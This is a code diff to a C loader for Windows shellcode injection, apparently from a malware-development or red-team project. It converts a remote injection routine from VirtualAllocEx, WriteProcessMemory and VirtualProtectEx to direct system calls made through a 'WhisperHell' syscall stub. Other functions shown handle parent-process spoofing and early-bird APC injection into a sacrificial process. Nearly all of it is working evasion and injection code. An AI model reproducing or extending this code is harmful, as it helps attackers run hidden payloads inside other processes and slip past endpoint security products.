@@ -257,7 +257,6 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
-	PRINTA("[+] DONE \n");
 	if (hThread != 0x0) {
 		PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
 	}
@@ -390,35 +389,58 @@ BOOL CreatePpidSpoofedProcessWithAlertableThread(IN HANDLE hParentProcess, IN LP
 	return FALSE;
 }
 
-// TODO: use syscalls
 BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, OUT PVOID* ppInjectedShellcodeAddress)
 {
-	PVOID	pShellcodeAddress = NULL;
-	SIZE_T	sNumberOfBytesWritten = NULL;
-	DWORD	dwOldProtection = NULL;
+	NTSTATUS	status = 0;
+	PVOID		pShellcodeAddress = NULL;
+	SIZE_T		sNumberOfBytesAllocated = sSizeOfShellcode;
+	SIZE_T		sNumberOfBytesWritten = NULL;
+	DWORD		dwOldProtection = NULL;
 
-	// Allocate memory in the remote process of size sSizeOfShellcode 
-	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (pShellcodeAddress == NULL) {
+	// Allocate memory in the remote process of size sSizeOfShellcode
+	WhisperHell(g_SyscallsTable.NtAllocateVirtualMemory.wSystemCall);
+	if ((status = NtAllocateVirtualMemory(
+		hProcess,
+		&pShellcodeAddress,
+		0,
+		&sNumberOfBytesAllocated,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_READWRITE))
+		!= 0x0) {
 		PRINTA("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
-	PRINTA("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);
+	PRINTA("[+] Allocated Memory At : 0x%p With Allocated Size: %d \n", pShellcodeAddress, (DWORD)sNumberOfBytesAllocated);
 
 
 	PRINTA("[#] Press <Enter> To Write Payload ... \n");
 	GETCHAR();
+
 	// Write the shellcode in the allocated memory
-	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
+	WhisperHell(g_SyscallsTable.NtWriteVirtualMemory.wSystemCall);
+	if ((status = NtWriteVirtualMemory(
+		hProcess,
+		pShellcodeAddress,
+		pShellcode,
+		sSizeOfShellcode,
+		&sNumberOfBytesWritten)) != 0x0 ||
+		sNumberOfBytesWritten != sSizeOfShellcode) {
 		PRINTA("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
-	PRINTA("[i] Successfully Written %d Bytes\n", (DWORD)sNumberOfBytesWritten);
+	PRINTA("[+] Successfully Written %d Bytes\n", (DWORD)sNumberOfBytesWritten);
 
 	ZeroMemoryEx(pShellcode, sSizeOfShellcode);
 
 	// Make the memory region executable
-	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+	WhisperHell(g_SyscallsTable.NtProtectVirtualMemory.wSystemCall);	
+	if ((status = NtProtectVirtualMemory(
+		hProcess, 
+		&pShellcodeAddress, 
+		&sNumberOfBytesWritten,
+		PAGE_EXECUTE_READWRITE, 
+		&dwOldProtection))
+		!= 0x0) {
 		PRINTA("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
@@ -443,7 +465,7 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 	}
 	PRINTA("[+] Created Sacrificial Process: %s with PID: %d And Handle: %p!\n", pstrSacrificalProcessName, dwProcessId, hProcess);
 
-	PRINTA("Press <Enter> To Inject Shellcode ... \n");
+	PRINTA("[#] Press <Enter> To Inject Shellcode ... \n");
 	GETCHAR();
 
 	// Inject the shellcode to the sacrificial process
@@ -452,7 +474,7 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 		return -1;
 	}
 	PRINTA("[+] Shellcode Injected At : 0x%p \n", pInjectedAddress);
-	PRINTA("[i] Press <Enter> To Queue The APC ... \n");
+	PRINTA("[#] Press <Enter> To Queue The APC ... \n");
 	GETCHAR();
 
 	// TODO: use syscall NtQueueApcThread
